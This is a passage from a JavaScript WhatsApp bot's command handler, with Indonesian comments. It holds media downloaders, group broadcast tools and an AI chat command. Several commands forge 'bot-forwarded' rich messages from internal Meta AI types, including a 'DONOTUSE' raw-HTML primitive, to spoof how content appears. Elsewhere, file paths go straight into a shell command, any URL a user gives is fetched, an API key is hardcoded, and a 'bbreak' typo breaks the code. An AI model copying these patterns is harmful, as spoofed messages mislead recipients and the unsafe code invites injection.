.center{text-align:center;padding:28px 10px 8px}
.center .logo{font:900 76px Georgia,serif;color:#20ff20;letter-spacing:-7px;text-shadow:0 0 8px #20ff20,0 0 20px #063}
.center .version{margin-top:10px;color:#91a391;font:600 12px monospace}
.center .desc{margin-top:8px;color:#526652;font-size:10px}
</style>
</head>
<body>
<div class="wrap">
<div class="center">
<div class="logo">NoT - CoRe</div>
<div class="version">27-05-11</div>
<div class="desc">WhatsApp - Web's Fandi Armansyah</div>
</div>
<div class="line"></div>
<div class="title">${title}</div>
<div class="sub">${sub}</div>
${content}
<div class="footer">FandiXpL</div>
</div>
</body>
</html>`

  const section = primitive => ({
    __typename: "GenAIUnifiedResponseSection",
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive
    }
  })

  const htmlSection = payload => section({
    __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
    trusted_sources: [],
    payload
  })

  const tab = (id, header, sections) => ({
    id,
    tab_header: header,
    sections
  })

  const id = `${Date.now()}_${Math.random().toString(36).slice(2)}`

  // MENU HOME (Tanpa sapaan/waktu)
  const home = page(
    "Snow Home",
    "About - Me",
    `<div class="grid">
      <div class="card"><b>MY DREAM</b><span>Saya adalah seorang siswa SmK yang mempunyai impian menjadi [ Developer ] yang di mana itu adalah suatu impian aku.</span></div>
      <div class="card"><b>ABOUT ME</b><span>Saya Fandi, saya seorang yang mempunyai sifat yang tidak berkelangsungan hidup, terkadang hidup aku ini sesuai dengan situasi dunia bekerja.</span></div>
      <div class="card"><b>MY WIFE</b><span>Saya Fandi, saya adalah seorang menyediri, jika ada yang bertanya tentang pacar saya? saya selalu bilang tidak ada hehe.</span></div>
      <div class="card"><b>NoTCoRe</b><span>NotCore adalah bot saya, saya sangat suka dengan nama itu, vibes yang keliahatan keren dan moderen.</span></div>
    </div>`
  )

  // MENU INFO (Tanpa data waktu/user)
  const info = page(
    "Coment Bot'S",
    "Looking at the menu contents",
    `<div class="grid">
      <div class="card"><b>270511</b><span>Melihat isi menu utama bot.</span></div>
      <div class="card"><b>ABOUT-ME</b><span>Melihat isi web owner.</span></div>
      <div class="card"><b>PLAY</b><span>Mengambil lagu yang anda inginkan, tinggal kasih nama lagu ya aja.</span></div>
      <div class="card"><b>PING</b><span>Melihat jaringan, dan kecepan bot bekerja.</span></div>
    </div>`
  )

  const DATA = Buffer.from(JSON.stringify({
    __typename: "GenAIUnifiedResponse",
    response_id: id,
    sections: [
      htmlSection(`<div style="background:#050805;height:260px;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;font-family:Arial,sans-serif">
  
  <!-- CSS Animasi -->
  <style>
    @keyframes jalanTerus {
      0% { transform: translateX(100%); }
      100% { transform: translateX(-100%); }
    }
    .teks-bergerak {
      display: inline-block;
      white-space: nowrap;
      animation: jalanTerus 4s linear infinite; /* 4s = kecepatan, ubah angkanya jika perlu */
      font: 900 50px Georgia, serif;
      color: #20ff20;
      text-shadow: 0 0 8px #20ff20, 0 0 22px #063;
      letter-spacing: 2px;
    }
  </style>

  <!-- Teks yang bergerak -->
  <div class="teks-bergerak">WhatsApp All Code BY Fandi.XpL</div>
  
</div>`),

      section({
        __typename: "FOATextPrimitive",
        text: `☞ ☜.`
      }),

      section({
        __typename: "GenAI3PExtWidgetPrimitive",
        header: {
          __typename: "GenAI3PExtWidgetStandardHeader",
          title: "BACK MENU ONE"
        },
        body: {
          __typename: "GenAI3PExtCalendarEventList",
          ctas: [
            {
              label: "270511",
              state: "PENDING",
              kind: "OTHER",
              tool_call_id: `${id}_270511`,
              toast: {
                label: "270511",
                __typename: "GenAI3PExtWidgetToast"
              },
              __typename: "GenAI3PExtWidgetCTA"
            }
          ],
          sections: []
        }
      })
    ],
    embedded_screens: [
      {
        id: `${id}_screen`,
        title: "NOT-CORE",
        content: [
          {
            __typename: "FOAEmbeddedScreenContentTabbed",
            tabs: [
              tab(`${id}_home`, "Inicio", [htmlSection(home)]),
              tab(`${id}_info`, "Info", [htmlSection(info)])
            ]
          }
        ]
      }
    ]
  })).toString("base64")

  // Struktur CONTENT yang sudah diperbaiki (tanpa raw & messageSecret manual)
  const CONTENT = {
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [],
          unifiedResponse: {
            data: DATA
          },
          contextInfo: {
            isForwarded: true,
            forwardOrigin: 4,
            participant: "13135550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              protocolMessage: { type: 25 }
            }
          }
        }
      }
    }
  }

  await WaSocket.sendMessage(from, CONTENT, {
    userJid: WaSocket.user.id
  })
} break;
            
    case "ping": {
      const timestamp = speed();
      const latens = speed() - timestamp;
      reply(`*pong! ${latens.toFixed(4)}ms*`)
    } break;
    
    case "refresh": {
      if (!isBot) return;
      function cleanFolder(folderPath, excludeFile) {
        fs.readdir(folderPath, (_, files) => {
          files?.forEach(file => {
            if (file!== excludeFile) fs.unlink(path.join(folderPath, file), () => {});
          });
        });
      }
      reply("Refreshing...");
      cleanFolder("./sessions", "creds.json")
    } break;
    
    case "restart": {
      if (!isBot) return;
      reply("restarting")
      process.exit()
    } break;
    
    case "jdx": 
    case "mesinfo": {
      if (!m.quoted) return reply(`reply to a message to info`);
      let tdx = m.quoted.key.participant;
        if (!tdx) return reply(`Error`);
      try {
      let devices = await WaSocket.getUSyncDevices([tdx]);
        console.log('Data Result:', devices); 
        let jids = devices[0].jid; 
        reply(`*#Information*

- Type : *${m.quoted.mtype}*
- Perfix ID : ${m.quoted.id.slice(0, 5)}
- ID : ${jids}
- FromMe : *${m.quoted.fromMe? 'Yes' : 'No'}*
  `);
    } catch (e) {
        reply(String(e))
      }
    } break;
    
    case "sprem": {
      if (!m.quoted) return reply(`reply to a sticker to premium`);
      let x = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
      if (!x) return;
      if (x?.stickerMessage) {
        let z = proto.Message.fromObject({ stickerMessage: {...x.stickerMessage, premium: 1 }});
        await WaSocket.relayMessage(from, z, { messageId: null });
      }
      else if (x?.lottieStickerMessage?.message?.stickerMessage) {
        let z = proto.Message.fromObject({
          lottieStickerMessage: { message: { stickerMessage: {...x.lottieStickerMessage.message.stickerMessage, premium: 1 }}
          }
        });
        await WaSocket.relayMessage(from, z, { messageId: null });
      }
    } break;
    
    case "ptv": {
    if (!m.quoted) return reply("Masukkan link video!")

    await WaSocket.sendMessage(m.chat, {
        video: { url: text },
        ptv: true
    }, {
        quoted: m
    })
}
break
    
  case 's':
case 'stc':
case 'sticker': {
    try {
        // PASTIKAN ADA PESAN YANG DIQUOTE
        if (!m.quoted) {
            return WaSocket.sendMessage(from, { 
                text: '⚠️ Balas foto/video dengan perintah .s' 
            });
        }
        
        // LANGSUNG DOWNLOAD
        console.log('Downloading...');
        const buffer = await WaSocket.downloadMediaMessage(m.quoted);
        console.log('Download success, size:', buffer.length);
        
        // KIRIM STIKER
        await WaSocket.sendMessage(from, {
            sticker: buffer,
            pack: 'NotCore-/-Ai',
            author: 'FanXpL',
        });
        
    } catch (error) {
        console.log('ERROR DETAIL:', error);
        WaSocket.sendMessage(from, { 
            text: `❌ ${error.message}` 
        });
    }
}
break;
            
    case "insp": {
      if (!text && !m.quoted) return reply(`reply message to document json`)
      let quotedType = m.quoted?.mtype || ""
      let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2)
      const acak = `insp-${crypto.randomBytes(6).toString("hex")}.json`
      await WaSocket.sendMessage(from, {
        document: Buffer.from(penis),
        fileName: acak,
        mimetype: "application/json"
       }, { quoted: m })
    } break;
    case "js": {
      if (!text &&!m.quoted) return reply(`reply to a message`)
      let xjson = JSON.stringify({ [m.quoted.mtype]: m.quoted}, null, 2)
       await WaSocket.sendMessage(from, {
          text: `${xjson}`,
          interactiveButtons: [
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: `Copy JSON`,
                copy_code: `${xjson}`
              })
            }
          ]
       })
    } break;
    
    case "get": {
      const url = text?.trim();
      if (!/^https?:\/\//.test(url)) return reply(`Ex : get link.com`);
      const ajg = await fetch(url, { redirect: 'follow' });
      if (!ajg.ok) return reply(`Gagal fetch: ${ajg.status} ${ajg.statusText}`);
      const contentLength = parseInt(ajg.headers.get("content-length") || "0");
      if (contentLength > 100 * 1024 * 1024) {
        return reply(`File kegedean: ${contentLength} bytes. Maks 100MB`);
      } let contentType = ajg.headers.get("content-type") || "";
      if (contentType.startsWith("image/")) {
        await WaSocket.sendMessage(from, {
          image: { url: url }
        }, { quoted: m });
        break;
      } if (contentType.startsWith("video/")) {
        await WaSocket.sendMessage(from, {
          video: { url: url }
        }, { quoted: m });
        break;
      } if (contentType.startsWith("audio/")) {
        await WaSocket.sendMessage(from, {
          audio: { url: url },
          mimetype: 'audio/mpeg',
          ptt: true
        }, { quoted: m });
        break;
      }
      let alak = Buffer.from(await ajg.arrayBuffer());
      try {
        alak = util.format(JSON.parse(alak + ""));
      } catch (e) {
        alak = alak + "";
      }
      await WaSocket.sendMessage(from, {
        text: alak.slice(0, 65536)
      }, { quoted: m });
    } break;
    
    case "addprem": {
      if (!isBot) return reply(global.mess.owner)
      if (!args[0]) return reply("Ex : addprem 628xxx")
      const jid = formatNumber(args[0])
      if (!jid) return reply("Format nomor tidak valid")
      const premPath = "./libraries/databases/premiumz.json"
      let premz = []
      if (fs.existsSync(premPath)) {
        try {
          premz = JSON.parse(fs.readFileSync(premPath, "utf8"))
          if (!Array.isArray(premz)) premz = []
        } catch (e) { premz = [] }
      }
      if (premz.includes(jid)) return reply("Nomor ini sudah premium")
      premz.push(jid)
      fs.writeFileSync(premPath, JSON.stringify(premz, null, 2))
      reply(`Premium added : ${jid}\nTotal premium : ${premz.length}`)
    } break;
    
    case "delprem": {
      if (!isBot) return reply(global.mess.owner)
      if (!args[0]) return reply("Ex : delprem 628xxx")
      const jid = formatNumber(args[0])
      if (!jid) return reply("Format nomor tidak valid")
      const premPath = "./libraries/databases/premiumz.json"
      if (!fs.existsSync(premPath)) return reply("Belum ada user premium")
      let premz = JSON.parse(fs.readFileSync(premPath, "utf8"))
      if (!premz.includes(jid)) return reply("Nomor ini bukan premium")
      premz = premz.filter(v => v!== jid)
      fs.writeFileSync(premPath, JSON.stringify(premz, null, 2))
      reply(`Premium deleted :\n${jid}\nTotal premium : ${premz.length}`)
    } break;
    
    case "self": {
      if (!isBot) return reply(global.mess.botz);
      if (!WaSocket.public && isBot) return reply("Botz in self mode already");
      WaSocket.public = false
      reply("Mode self activated")
    } break;
    
    case "public": {
      if (!isBot) return reply(global.mess.botz);
      if (WaSocket.public && isBot) return reply("Botz in published mode already");
      WaSocket.public = true
      reply("Mode publish activated")
    } break;
    case "tagall": {
      if (!m.isGroup) return reply(global.mess.botz);
      if (!isBot) return;
      await WaSocket.relayMessage(from, {
        albumMessage: {
          contextInfo: {
            mentionedJid: participants.map(x => x.id)
          }
        }
      }, {});
    } break;
    
    case 'toimg': {
      if (!/webp/.test(mime)) return reply(`Usage : Toimg Reply Sticker`);
        let media = await WaSocket.downloadAndSaveMediaMessage(quoted);
         WaSocket.sendMessage(from, { react: { text: "⚡", key: m.key }});
        let xs = await getRandomFile('.png');
         exec(`ffmpeg -i ${media} ${xs}`, (err) => {
            fs.unlinkSync(media);
            if (err) return err;
            let buffer = fs.readFileSync(xs);
            WaSocket.sendMessage(from, {
              image: buffer,
            }, { quoted: m });
            fs.unlinkSync(xs);
        });
    } break;
    
    case "tt": case "tiktok": {
    if (!text) return reply(`Ex : tiktok linknya`)
    if (!text.startsWith("https://")) return reply(example("url"))
     await tiktokdownloadz(q).then(async (result) => {
        if (!result.status) return reply("Error")
        if (result.durations == 0 && result.duration == "0 Seconds") {
            let araara = [], urutan = 0
            for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                    image: { url: `${a.url}` }
                }, {
                    upload: WaSocket.waUploadToServer
                })
                araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: `${urutan += 1}`,
                        hasMediaAttachment: true,
                        ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: `{"display_text":"Link Tautan Foto","url":"${a.url}","merchant_url":"https://www.google.com"}`
                        }]
                    })
                })
            }
            const msgii = await generateWAMessageFromContent(from, {
                viewOnceMessageV2Extension: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },

                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: `*#Tiktokz Downloader*\n\n› Author : ${result.author.nickname}\n› Title : ${result.title}`
                            }),

                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: araara
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m })

            await WaSocket.relayMessage(from, msgii.message, {
                messageId: msgii.key.id
            })
        } else {
            let urlVid = await result.data.find(
                e => e.type == "nowatermark_hd" || e.type == "nowatermark"
            )
            await WaSocket.sendMessage(from, {
                video: { url: urlVid.url },
                mimetype: "video/mp4",
                caption: `*#Tiktokz Downloader*\n\n› Author : ${result.author.nickname}\n› Title : ${result.title}`
            }, {
                quoted: m
            })
        }
      }).catch((e) => console.log(e))
    } break;
    
    case "igdl": case "instagram-dl": {
      if (!args[0]) return reply("Ex : igdl linknya");
      try {
          await WaSocket.sendMessage(from, {
              react: { text: "⏳", key: m.key, }
          });
          let res = await igdownloadz(args[0]);
          if (res.error) {
              await WaSocket.sendMessage(from, {
                  react: { text: "❌", key: m.key, }
              });
              return reply(`Error:${res.error}`);
          }
          if (res.platform === "facebook" || res.platform === "instagram") {
              await WaSocket.sendMessage(from, {
                  react: { text: "⏳", key: m.key, }
              });
              await WaSocket.sendMessage(from, { video: { url: res.video }, caption: "" }, { quoted: m });
          }
      } catch (error) {
        console.error(error);
          await WaSocket.endMessage(from, { react: { text: "❌", key: m.key, }
          });
         reply("Erorr");
      }
    } bbreak
    
case 'ai':
case 'airich': {
  try {
    const SOCKET = typeof WaSocket !== 'undefined' ? WaSocket : client;
    const target = m.chat || from || m.key.remoteJid;

    // ==========================================
    // 1. DETEKSI TAG BOT PAKAI JID BOT LANGSUNG
    // ==========================================
    const botJid = SOCKET.user.id; // Contoh: 628xxx:12@s.whatsapp.net
    const botLid = SOCKET.user.lid; // Contoh: 261877762359457@lid
    
    // Cek apakah bot di-tag di grup
    const isBotTagged = m.mentionedJid && m.mentionedJid.some(jid => 
      jid === botJid || 
      jid === botLid ||
      (botJid && jid.includes(botJid.split('@')[0].split(':')[0])) ||
      (botLid && jid.includes(botLid.split('@')[0]))
    );

    // ==========================================
    // 2. AMBIL PERTANYAAN
    // ==========================================
    let question = args.join(' ');
    
    // Kalau user cuma nge-tag tanpa ngetik command, ambil teks aslinya
    if (!question && isBotTagged) {
      question = m.text || m.body || '';
      // Hapus tag dari teks biar AI ga bingung
      if (m.mentionedJid && m.mentionedJid.length > 0) {
        for (const jid of m.mentionedJid) {
          question = question.replace(new RegExp(`@${jid.split('@')[0]}`, 'g'), '').trim();
        }
      }
    }

    // Kalau ga ada pertanyaan, abaikan
    if (!question) return;

    // ==========================================
    // 3. SESSION HANDLING
    // ==========================================
    const sessionDir = path.join(__dirname, 'libraries');
    const sessionFile = path.join(sessionDir, 'session.json');
    
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    if (!fs.existsSync(sessionFile)) fs.writeFileSync(sessionFile, JSON.stringify({}, null, 2));

    let sessions = {};
    try { sessions = JSON.parse(fs.readFileSync(sessionFile)); } catch { sessions = {}; }

    let sessionId = sessions[m.sender];
    if (!sessionId) {
      sessionId = crypto.randomUUID();
      sessions[m.sender] = sessionId;
      fs.writeFileSync(sessionFile, JSON.stringify(sessions, null, 2));
    }

    // ==========================================
    // 4. KIRIM PESAN LOADING (SEND RICH)
    // ==========================================
    if (typeof SOCKET.sendRich !== 'function' || typeof SOCKET.editRich !== 'function') {
      return reply("❌ Fitur sendRich/editRich tidak tersedia.");
    }

    const loading = await SOCKET.sendRich(target, { text: '⏳ *Thinking...*' });

    // ==========================================
    // 5. PANGGIL API AI
    // ==========================================
    const { data } = await axios.post(
      'https://me.fidzzcodex.my.id/ai/gemini',
      {
        apikey: 'fidzzcodex',
        prompt: question,
        session_id: sessionId
      }
    );

    let result = data.result || data.response || data.message || 'Tidak ada jawaban.';

    // ==========================================
    // 6. PARSING CODE BLOCK & TEXT
    // ==========================================
    const sections = [];
    const codeRegex = /```(\w+)?\n([\s\S]*?)```/g;
    let lastIndex = 0;
    let match;

    while ((match = codeRegex.exec(result)) !== null) {
      const textBefore = result.slice(lastIndex, match.index).trim();
      if (textBefore) {
        sections.push({
          __typename: 'GenAIUnifiedResponseSection',
          view_model: {
            __typename: 'GenAISingleLayoutViewModel',
            primitive: { __typename: 'GenAIMarkdownTextUXPrimitive', text: textBefore, inline_entities: [] }
          }
        });
      }

      const lang = match[1] || 'javascript';
      const codeContent = match[2].trim();
      const code_blocks = codeContent.split('\n').map(line => ({ content: line + '\n', type: 'DEFAULT' }));

      sections.push({
        __typename: 'GenAIUnifiedResponseSection',
        view_model: {
          __typename: 'GenAISingleLayoutViewModel',
          primitive: { __typename: 'GenAICodeUXPrimitive', language: lang, code_blocks }
        }
      });

      lastIndex = codeRegex.lastIndex;
    }

    const textAfter = result.slice(lastIndex).trim();
    if (textAfter) {
      sections.push({
        __typename: 'GenAIUnifiedResponseSection',
        view_model: {
          __typename: 'GenAISingleLayoutViewModel',
          primitive: { __typename: 'GenAIMarkdownTextUXPrimitive', text: textAfter, inline_entities: [] }
        }
      });
    }

    if (sections.length === 0) {
      sections.push({
        __typename: 'GenAIUnifiedResponseSection',
        view_model: {
          __typename: 'GenAISingleLayoutViewModel',
          primitive: { __typename: 'GenAIMarkdownTextUXPrimitive', text: result, inline_entities: [] }
        }
      });
    }

    // ==========================================
    // 7. EDIT PESAN JADI JAWABAN
    // ==========================================
    await SOCKET.editRich(target, loading.key, { sections });

  } catch (error) {
    console.error('[AI ERROR]', error);
    m.reply(`❌ *Error:* ${error.message}`);
  }
}
break;

case "dl":
case "download":
case "down": {
    if (!args.length) return reply(`❌ ${prefix + command} [link]`);
    
    const link = args[0];
    if (!link.startsWith('http')) return reply(`❌ Link invalid!`);

    try {
        await reply(`⏳ *Processing...*`);

        const res = await fetch('https://dl.valore.web.id/api/download', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url: link })
        });
        const data = await res.json();
        console.log('DL:', data);

        // AMBIL URL DARI MANA SAJA (FLEXIBLE)
        const url = data.data?.medias?.[0]?.url || 
                    data.data?.url || 
                    data.data?.download_url ||
                    data.url ||
                    data.download_url;

        if (url) {
            await WaSocket.sendMessage(from, { 
                video: { url: url },
                caption: `📥 Download berhasil!`
            }, { quoted: m });
        } else {
            await reply(`❌ Gagal dapat URL!`);
        }
    } catch (e) {
        await reply(`❌ ${e.message}`);
    }
}
break;

case "leave":
case "leavegc":
case "keluar": {
    if (!isBot) return reply(global.mess.owner);
    if (!isGroup) return reply("❌ Perintah ini hanya untuk grup!");
    
    try {
        const groupName = groupMetadata?.subject || 'Grup ini';
        await reply(`⏳ *Keluar dari ${groupName}...*`);
        await WaSocket.groupLeave(from);
        // Bot akan keluar, reply tidak akan terkirim karena sudah keluar dari grup
    } catch (error) {
        console.error('Leave group error:', error);
        reply(`❌ Error: ${error.message}`);
    }
}
break;

case "jpm":
case "broadcastgroup":
case "bcgc": {
    if (!isBot) return reply(global.mess.owner);
    if (!text) return reply(`📢 *Penggunaan:*\n${prefix + command} [pesan]`);
    
    try {
        // Ambil semua grup yang diikuti bot
        const groups = await WaSocket.groupFetchAllParticipating();
        const groupList = Object.values(groups);
        
        if (groupList.length === 0) {
            return reply("❌ Bot tidak berada di grup mana pun!");
        }

        // Konfirmasi sebelum mengirim
        await reply(`⏳ *Mengirim pesan ke ${groupList.length} grup...*`);

        let success = 0;
        let failed = 0;
        let failedGroups = [];

        // Kirim pesan ke setiap grup
        for (const group of groupList) {
            try {
                await WaSocket.sendMessage(group.id, {
                    text: `📢 *Broadcast dari Owner*\n\n${text}`
                });
                success++;
                // Delay antar pengiriman agar tidak kena spam
                await sleep(1000);
            } catch (err) {
                failed++;
                failedGroups.push(group.subject || group.id);
                console.log(`Gagal kirim ke ${group.subject}:`, err.message);
            }
        }

        // Kirim laporan
        let report = `✅ *Broadcast Selesai!*\n\n`;
        report += `📊 *Statistik:*\n`;
        report += `└ Berhasil: ${success} grup\n`;
        report += `└ Gagal: ${failed} grup\n\n`;
        
        if (failedGroups.length > 0) {
            report += `❌ *Gagal dikirim ke:*\n`;
            report += failedGroups.slice(0, 10).map(g => `└ ${g}`).join('\n');
            if (failedGroups.length > 10) {
                report += `\n└ ...dan ${failedGroups.length - 10} grup lainnya`;
            }
        }

        await reply(report);

    } catch (error) {
        console.error('Broadcast error:', error);
        reply(`❌ Error: ${error.message}`);
    }
}
break;

case "del":
case "delete":
case "hapus": {
    if (!m.quoted) return reply("❌ Balas pesan yang mau dihapus!");
    
    try {
        // Cek apakah di grup atau private
        const isGroupChat = from.endsWith("@g.us");
        
        // Untuk private chat: bisa hapus tanpa admin
        // Untuk grup: harus admin + bot admin
        if (isGroupChat) {
            if (!isBotAdmins) return reply("❌ Bot harus jadi admin!");
            if (!isAdmins && !isBot) return reply("❌ Hanya admin/owner yang bisa hapus pesan!");
        }
        
        // Hapus pesan yang di-quote
        await WaSocket.sendMessage(from, {
            delete: m.quoted.key
        });
        
        // Hapus pesan perintah juga (opsional)
        await WaSocket.sendMessage(from, {
            delete: m.key
        });
        
    } catch (error) {
        console.error('Delete error:', error);
        reply(`❌ Error: ${error.message}`);
    }
}
break;

case "delme":
case "deleteme":
case "hapusaku": {
    if (!m.quoted) return reply("❌ Balas pesan yang mau dihapus!");
    
    try {
        const isGroupChat = from.endsWith("@g.us");
        
        // Untuk grup butuh bot admin
        if (isGroupChat && !isBotAdmins) {
            return reply("❌ Bot harus jadi admin!");
        }
        
        // Hapus pesan yang di-quote (bisa pesan sendiri atau orang lain)
        await WaSocket.sendMessage(from, {
            delete: m.quoted.key
        });
        
    } catch (error) {
        console.error('Delete error:', error);
        reply(`❌ Error: ${error.message}`);
    }
}
break;
    
    case 'pin':
case 'pinfoto':
case 'pinterest': {
    const axios = require('axios');

    async function pinterest(query) {
        try {
            // Ambil cookie dulu
            const cookieRes = await axios.get('https://www.pinterest.com/csrf_error/', {
                headers: {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0'
                },
                timeout: 15000
            });
            const setCookie = cookieRes.headers['set-cookie'];
            const cookies = setCookie
                ? setCookie.map(c => c.split(';')[0].trim()).join('; ')
                : '';

            const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
            const params = {
                source_url: `/search/pins/?q=${encodeURIComponent(query)}`,
                data: JSON.stringify({
                    options: {
                        isPrefetch: false,
                        query: query,
                        scope: "pins",
                        no_fetch_context_on_resource: false
                    },
                    context: {}
                }),
                _: Date.now()
            };

            const headers = {
                'accept': 'application/json, text/javascript, */*, q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'cookie': cookies,
                'referer': 'https://www.pinterest.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
                'x-app-version': 'c056fb7',
                'x-pinterest-appstate': 'active',
                'x-pinterest-pws-handler': 'www/ideas.js',
                'x-pinterest-source-url': `/search/pins/?q=${encodeURIComponent(query)}`,
                'x-requested-with': 'XMLHttpRequest'
            };

            const { data } = await axios.get(url, { headers, params, timeout: 20000 });

            const results = data?.resource_response?.data?.results || [];
            return results
                .filter(v => v.images?.orig?.url)
                .map(r => ({
                    upload_by: r.pinner?.username || 'Unknown',
                    caption: r.grid_title || r.title || 'No caption',
                    image: r.images.orig.url,
                    source: "https://id.pinterest.com/pin/" + r.id
                }));
        } catch (e) {
            console.error('Pinterest error:', e.message);
            return [];
        }
    }

    // ===== CEK INPUT =====
    if (!text) {
        return reply(`📌 *Cara:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);
    }

    let query = text;
    let imgCount = 3;

    const parts = text.trim().split(' ');
    const lastPart = parts[parts.length - 1];
    if (!isNaN(lastPart) && lastPart.trim() !== '') {
        imgCount = Math.min(parseInt(lastPart), 10);
        query = parts.slice(0, -1).join(' ');
    }

    if (!query.trim()) {
        return reply(`❌ Query tidak boleh kosong!`);
    }

    await reply(`⏳ *Mencari gambar "${query}"...*`);

    try {
        const results = await pinterest(query);
        if (results.length === 0) {
            return reply(`❌ Tidak ada hasil untuk "${query}"`);
        }

        const total = Math.min(results.length, imgCount);

        for (let i = 0; i < total; i++) {
            const r = results[i];

            // Ambil gambar jadi buffer
            let buffer;
            try {
                const imgRes = await axios.get(r.image, {
                    responseType: 'arraybuffer',
                    timeout: 20000,
                    headers: {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
                    }
                });
                buffer = Buffer.from(imgRes.data);
            } catch (err) {
                console.error(`Gagal download gambar ${i + 1}:`, err.message);
                continue;
            }

            const caption =
                `📌 *Pinterest (${i + 1}/${total})*\n\n` +
                `👤 Uploader: ${r.upload_by}\n` +
                `📝 ${r.caption}\n` +
                `🔗 ${r.source}`;

            await WaSocket.sendMessage(m.chat, {
                image: buffer,
                caption: caption
            }, { quoted: m });

            await sleep(1500);
        }

        await reply(`✅ *${total} gambar* dari Pinterest berhasil dikirim!\n🔍 Query: ${query}`);
    } catch (error) {
        console.error('Pinterest error:', error);
        reply(`❌ Error: ${error.message}`);
    }
}
break;

case "remini":
case "hd": {
  try {
    const target = from || m.chat;
    
    // 1. Cek apakah user nge-reply gambar
    const quoted = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted || !quoted.imageMessage) {
      return "❌ Reply (balas) foto yang mau di-HD-kan, lalu ketik .remini";
    }

    // 2. Ambil ID pesan dan siapkan objek download
    const quotedKey = m.message.extendedTextMessage.contextInfo.stanzaId;
    const quotedParticipant = m.message.extendedTextMessage.contextInfo.participant;
    const quotedMsg = {
      key: {
        remoteJid: target,
        fromMe: false,
        id: quotedKey,
        participant: quotedParticipant
      },
      message: quoted
    };

    await m.reply("⏳ Sedang memproses gambar, mohon tunggu...");

    // 3. Download gambar dari WhatsApp
    const buffer = await WaSocket.downloadMediaMessage(
      quotedMsg, 'buffer', {}, { logger: console, reuploadRequest: WaSocket.updateMediaMessage }
    );

    // 4. Simpan sementara ke folder bot agar bisa dibaca oleh scraper
    const fs = require('fs');
    const path = require('path');
    const tmpPath = path.join(__dirname, `tmp_${Date.now()}.jpg`);
    fs.writeFileSync(tmpPath, buffer);

    // 5. Panggil fungsi scraper dari file remini.js
    const { enhance } = require('./remini.js'); // Sesuaikan path jika ditaruh di folder lain
    const result = await enhance(tmpPath);

    // 6. Hapus file sementara
    if (fs.existsSync(tmpPath)) fs.unlinkSync(tmpPath);

    // 7. Cek hasil dan kirim balik ke WhatsApp
    if (result.status && result.enhanced_image) {
      await WaSocket.sendMessage(target, {
        image: { url: result.enhanced_image }, // Bisa local path atau URL
        caption: `✅ *Berhasil di-HD kan!*\n\n• Resolusi: ${result.original_resolution} ➔ ${result.output_resolution}\n• Ukuran: ${result.original_size} ➔ ${result.output_size}\n• Waktu: ${result.processing_time}`
      }, { quoted: m });
    } else {
      return `❌ Gagal memproses gambar: ${result.error}`;
    }

  } catch (e) {
    console.error("[REMINI] Error:", e);
    return "❌ Terjadi kesalahan: " + e.message;
  }
}
break;

case 'sopa': {
    try {
        const id = crypto.randomUUID();
        const now = Math.floor(Date.now() / 1000);

        const sports = {
            __typename: 'GenAISportsWidgetPrimitive',
            game_id: `tvz-${id}`,
            league: 'EURO',
            status: 'LIVE',
            status_detail: "72'",
            start_time_utc_seconds: now - 72 * 60,
            venue: 'Dick Stadium',
            group: 'XvX',
            content: {
                __typename: 'GenAISoccerGameContent',
                home_team: {
                    __typename: 'GenAISportsTeamRecord',
                    name: 'Fandi-XpL',
                    abbreviation: 'XLX',
                    score: 2
                },
                away_team: {
                    __typename: 'GenAISportsTeamRecord',
                    name: 'Fandi-XppL',
                    abbreviation: 'XLP',
                    score: 1
                }
            }
        };

        const DATA = Buffer.from(JSON.stringify({
            __typename: 'GenAIUnifiedResponse',
            response_id: id,
            sections: [{
                __typename: 'GenAIUnifiedResponseSection',
                view_model: {
                    __typename: 'GenAISingleLayoutViewModel',
                    primitive: sports
                }
            }]
        })).toString('base64');

        // PERSIS KAYAK KODE CATUR LU
        const msg = generateWAMessageFromContent(from, {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        unifiedResponse: { data: DATA },
                        contextInfo: {
                            isForwarded: true,
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }, {});

        await WaSocket.relayMessage(from, msg.message, {
            messageId: msg.key.id
        });

        console.log(`[SOPA] ${pushname} lagi nonton bola!`);

    } catch (error) {
        console.error('Error Sopa:', error);
        reply('❌ Gagal memuat match. Coba lagi nanti.');
    }
    break;
}
/// CASE CHAT EMOJI 🗿 ////
case 'hmph': {
    try {
        // ===== 1. Data sticker (hardcode) =====
        const stickerMsg = {
